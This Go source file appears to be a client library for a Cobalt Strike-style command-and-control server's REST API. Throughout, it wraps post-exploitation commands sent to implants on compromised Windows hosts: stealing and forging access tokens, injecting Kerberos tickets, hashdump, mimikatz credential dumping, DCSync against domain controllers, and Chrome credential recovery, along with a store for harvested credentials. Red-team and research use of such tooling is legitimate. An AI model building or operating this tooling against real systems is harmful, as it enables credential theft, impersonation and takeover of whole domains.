package csclient

import (
	"context"
	"fmt"
)

// --- Token Operation DTOs ---

// StealTokenDto represents a steal token request
type StealTokenDto struct {
	PID        int `json:"pid"`
	AccessMask int `json:"accessMask,omitempty"`
}

// MakeTokenLogonNameDto represents a make token request with domain/user/password
type MakeTokenLogonNameDto struct {
	Domain   string `json:"domain,omitempty"`
	User     string `json:"user"`
	Password string `json:"password"`
}

// MakeTokenUpnDto represents a make token request with UPN
type MakeTokenUpnDto struct {
	UPN      string `json:"upn"`
	Password string `json:"password"`
}

// KerberosTicketUseDto represents a Kerberos ticket use request
type KerberosTicketUseDto struct {
	Ticket string            `json:"ticket"` // @files/file.ticket or @artifacts/kerberos/file.ticket
	Files  map[string]string `json:"files,omitempty"`
}

// --- Token Store Operation DTOs ---

// TokenStoreStealDto represents a token store steal request
type TokenStoreStealDto struct {
	PID        int `json:"pid"`
	AccessMask int `json:"accessMask,omitempty"`
}

// TokenStoreStealAndUseDto represents a token store steal and use request
type TokenStoreStealAndUseDto struct {
	PID        int `json:"pid"`
	AccessMask int `json:"accessMask,omitempty"`
}

// TokenStoreUseDto represents a token store use request
type TokenStoreUseDto struct {
	ID int `json:"id"`
}

// TokenStoreRemoveDto represents a token store remove request
type TokenStoreRemoveDto struct {
	IDs []int `json:"ids"`
}

// TokenDto represents a token in the token store
type TokenDto struct {
	ID        int    `json:"id"`
	PID       int    `json:"pid"`
	User      string `json:"user"`
	Timestamp string `json:"timestamp"`
	Type      string `json:"type"`
}

// TokenStoreListResponse represents the token store list response
type TokenStoreListResponse struct {
	Timestamp string     `json:"timestamp"`
	Tokens    []TokenDto `json:"tokens"`
	Type      string     `json:"type"`
}

// --- Credential Harvesting DTOs ---

// MimikatzSpawnDto represents a mimikatz command execution request
type MimikatzSpawnDto struct {
	Command string `json:"command"`
	Mode    string `json:"mode"` // normal, elevate, impersonate
}

// DcSyncSpawnDto represents a DCSync request
type DcSyncSpawnDto struct {
	Domain string `json:"domain"`
	User   string `json:"user,omitempty"`
}

// --- Credential Data Store DTOs ---

// CredentialDto represents a credential in the data store
type CredentialDto struct {
	ID       string `json:"id,omitempty"`
	User     string `json:"user,omitempty"`
	Password string `json:"password,omitempty"`
	Realm    string `json:"realm,omitempty"`
	Note     string `json:"note,omitempty"`
	Host     string `json:"host,omitempty"`
	Source   string `json:"source,omitempty"`
}

// --- Token Operation Client Methods ---

// StealToken steals a token from a process
func (c *Client) StealToken(ctx context.Context, bid string, pid int) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/stealToken", bid)
	req := StealTokenDto{PID: pid}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute steal token: %w", err)
	}
	return &resp, nil
}

// MakeToken creates a token from specified credentials using domain/user/password
func (c *Client) MakeToken(ctx context.Context, bid string, domain, user, password string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/makeToken/logonName", bid)
	req := MakeTokenLogonNameDto{
		Domain:   domain,
		User:     user,
		Password: password,
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute make token: %w", err)
	}
	return &resp, nil
}

// MakeTokenUpn creates a token from specified credentials using UPN
func (c *Client) MakeTokenUpn(ctx context.Context, bid string, upn, password string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/makeToken/upn", bid)
	req := MakeTokenUpnDto{
		UPN:      upn,
		Password: password,
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute make token upn: %w", err)
	}
	return &resp, nil
}

// Rev2Self reverts to the original security context
func (c *Client) Rev2Self(ctx context.Context, bid string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/rev2self", bid)
	if err := c.doRequest(ctx, "POST", endpoint, EmptyDto{}, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute rev2self: %w", err)
	}
	return &resp, nil
}

// KerberosTicketUse applies a Kerberos ticket to the session
func (c *Client) KerberosTicketUse(ctx context.Context, bid string, ticketPath string, ticketData string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/kerberos/ticket/use", bid)
	req := KerberosTicketUseDto{
		Ticket: ticketPath,
		Files:  map[string]string{},
	}
	if ticketData != "" {
		req.Files[ticketPath] = ticketData
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute kerberos ticket use: %w", err)
	}
	return &resp, nil
}

// KerberosTicketPurge purges Kerberos tickets from the session
func (c *Client) KerberosTicketPurge(ctx context.Context, bid string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/kerberos/ticket/purge", bid)
	if err := c.doRequest(ctx, "POST", endpoint, EmptyDto{}, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute kerberos ticket purge: %w", err)
	}
	return &resp, nil
}

// --- Token Store Operation Client Methods ---

// TokenStoreSteal steals a token and stores it in the token store
func (c *Client) TokenStoreSteal(ctx context.Context, bid string, pid int) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/tokenStore/steal", bid)
	req := TokenStoreStealDto{PID: pid}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute token store steal: %w", err)
	}
	return &resp, nil
}

// TokenStoreStealAndUse steals a token, stores it, and immediately applies it
func (c *Client) TokenStoreStealAndUse(ctx context.Context, bid string, pid int) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/tokenStore/stealAndUse", bid)
	req := TokenStoreStealAndUseDto{PID: pid}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute token store steal and use: %w", err)
	}
	return &resp, nil
}

// TokenStoreUse uses a token from the token store
func (c *Client) TokenStoreUse(ctx context.Context, bid string, id int) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/tokenStore/use", bid)
	req := TokenStoreUseDto{ID: id}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute token store use: %w", err)
	}
	return &resp, nil
}

// TokenStoreRemove removes specific tokens from the token store
func (c *Client) TokenStoreRemove(ctx context.Context, bid string, id int) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/tokenStore/remove", bid)
	req := TokenStoreRemoveDto{IDs: []int{id}}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute token store remove: %w", err)
	}
	return &resp, nil
}

// TokenStoreRemoveAll removes all tokens from the token store
func (c *Client) TokenStoreRemoveAll(ctx context.Context, bid string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/tokenStore/removeAll", bid)
	if err := c.doRequest(ctx, "POST", endpoint, EmptyDto{}, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute token store remove all: %w", err)
	}
	return &resp, nil
}

// TokenStoreList lists all tokens in the token store for the specified beacon
func (c *Client) TokenStoreList(ctx context.Context, bid string) (*TokenStoreListResponse, error) {
	var resp TokenStoreListResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/state/tokenStore", bid)
	if err := c.doRequest(ctx, "POST", endpoint, EmptyDto{}, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to list token store: %w", err)
	}
	return &resp, nil
}

// --- Credential Harvesting Client Methods ---

// Hashdump dumps password hashes
func (c *Client) Hashdump(ctx context.Context, bid string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/hashdump", bid)
	if err := c.doRequest(ctx, "POST", endpoint, EmptyDto{}, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute hashdump: %w", err)
	}
	return &resp, nil
}

// LogonPasswords dumps plaintext credentials and NTLM hashes using mimikatz
func (c *Client) LogonPasswords(ctx context.Context, bid string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/logonPasswords", bid)
	if err := c.doRequest(ctx, "POST", endpoint, EmptyDto{}, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute logon passwords: %w", err)
	}
	return &resp, nil
}

// Mimikatz executes a mimikatz command
func (c *Client) Mimikatz(ctx context.Context, bid string, command string, mode string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/mimikatz", bid)
	req := MimikatzSpawnDto{
		Command: command,
		Mode:    mode,
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute mimikatz: %w", err)
	}
	return &resp, nil
}

// DcSync extracts NTLM password hash for domain users from domain controller
func (c *Client) DcSync(ctx context.Context, bid string, domain string, user string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/dcsync", bid)
	req := DcSyncSpawnDto{
		Domain: domain,
		User:   user,
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute dcsync: %w", err)
	}
	return &resp, nil
}

// ChromeDump recovers credential material from Google Chrome
func (c *Client) ChromeDump(ctx context.Context, bid string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/chromedump", bid)
	if err := c.doRequest(ctx, "POST", endpoint, EmptyDto{}, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute chromedump: %w", err)
	}
	return &resp, nil
}

// --- Credential Data Store Client Methods ---

// ListCredentials lists all credentials in the credentials data model
func (c *Client) ListCredentials(ctx context.Context) ([]CredentialDto, error) {
	var creds []CredentialDto
	if err := c.doRequest(ctx, "GET", "/api/v1/data/credentials", nil, &creds, true); err != nil {
		return nil, fmt.Errorf("failed to list credentials: %w", err)
	}
	return creds, nil
}

// AddCredential adds a credential to the credentials data model
func (c *Client) AddCredential(ctx context.Context, cred CredentialDto) error {
	if err := c.doRequest(ctx, "POST", "/api/v1/data/credentials", cred, nil, true); err != nil {
		return fmt.Errorf("failed to add credential: %w", err)
	}
	return nil
}

// GetCredential gets a specific credential from the credentials data model
func (c *Client) GetCredential(ctx context.Context, id string) (*CredentialDto, error) {
	var cred CredentialDto
	endpoint := fmt.Sprintf("/api/v1/data/credentials/%s", id)
	if err := c.doRequest(ctx, "GET", endpoint, nil, &cred, true); err != nil {
		return nil, fmt.Errorf("failed to get credential: %w", err)
	}
	return &cred, nil
}

// DeleteCredential deletes a credential from the credentials data model
func (c *Client) DeleteCredential(ctx context.Context, id string) error {
	endpoint := fmt.Sprintf("/api/v1/data/credentials/%s", id)
	if err := c.doRequest(ctx, "DELETE", endpoint, nil, nil, true); err != nil {
		return fmt.Errorf("failed to delete credential: %w", err)
	}
	return nil
}
